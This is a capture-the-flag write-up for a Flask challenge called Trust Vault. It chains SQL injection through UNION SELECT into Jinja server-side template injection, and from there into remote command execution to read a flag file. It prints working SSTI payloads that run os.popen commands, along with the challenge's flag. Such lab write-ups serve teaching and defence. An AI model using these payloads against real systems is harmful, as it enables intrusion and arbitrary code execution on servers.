Trust Vault – Writeup
Challenge Name

Trust Vault

Challenge Description

Leak the server-side flag stored on disk/environment by chaining the vulnerable SQL query with the legacy Jinja rendering.

1. Overview

Trust Vault is a Flask web application that exposes a search feature vulnerable to SQL Injection, and internally renders query results using legacy Jinja templates.
This combination allows chaining:

SQL Injection → Jinja SSTI → Python RCE → File Read → Flag

2. Initial Recon

Navigating the interface revealed key routes:

/login

/register

/search

/bookmarks

/audit

/reports

The /search page displayed sanitized SQL queries such as:

SELECT content FROM messages WHERE topic = '<input>'


This immediately indicated raw string concatenation and therefore potential SQL injection.

3. Verifying SQL Injection

Testing with a simple quote:

?topic='


Produced:

Error: unrecognized token: "'''"


This confirmed SQL syntax was breaking → SQL injection valid.

4. UNION Injection

We tested if output could be controlled:

?topic=' UNION SELECT 'TEST'-- -


The page displayed:

TEST


So the application accepts UNION SELECT with a string literal.

That means we can inject any Jinja expression through this SQLi.

5. Testing for Jinja SSTI

Injected:

?topic=' UNION SELECT '{{7*7}}'-- -


Output:

49


This confirmed that the result of the SQL query is passed through Jinja rendering, creating a direct server-side template injection (SSTI) primitive.

6. Achieving Remote Code Execution via SSTI

Jinja SSTI often allows access to Python internals through object chains.

Working payload:

{{ request.application.__globals__.__builtins__.__import__("os").popen("ls").read() }}


This executed and returned filesystem contents, confirming:

Python builtins accessible

OS commands executable through popen()

7. Locating the Flag

We searched the entire filesystem for files containing “flag”:

{{ request.application.__globals__.__builtins__.__import__("os").popen("find / -name '*flag*'").read() }}


The result revealed:

/flag-e8b7e25d1130eccde065de0d53d21fc8.txt

8. Reading the Flag

Final exploit:

?topic=' UNION SELECT '{{ request.application.__globals__.__builtins__.__import__("os").popen("cat /flag-e8b7e25d1130eccde065de0d53d21fc8.txt").read() }}'-- -


This executed the command server-side and returned the flag.

9. Flag
PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}

10. Attack Chain Summary
Step	Vulnerability	Result
1	SQL Injection	Inject arbitrary strings into SQL query
2	UNION SELECT	Force server to render attacker-controlled text
3	Jinja SSTI	Evaluate injected template expressions
4	Python Object Chain	Escalate to full Python execution
5	OS Command Execution	Run popen() commands
6	Read Flag	Extract file from disk

A perfect example of why mixing templating and SQL concatenation is like mixing gasoline and open flames.
